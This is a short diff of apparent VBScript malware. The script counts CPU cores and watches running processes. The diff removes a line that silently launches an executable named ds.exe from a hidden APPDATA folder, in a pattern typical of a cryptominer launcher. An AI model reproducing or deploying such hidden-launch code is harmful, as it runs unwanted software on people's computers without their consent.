@@ -13,7 +13,6 @@ For Each objItem In colItems
 cores=cores + objItem.NumberOfLogicalProcessors
 Next
 cores=cores-1
-WshShell.Run WshShell.ExpandEnvironmentStrings("%APPDATA%")&"\Aledaxo\ds.exe", 0
 do
 WScript.Sleep 500
 Set taskcolitem = objWMIService.ExecQuery("Select * from Win32_Process")
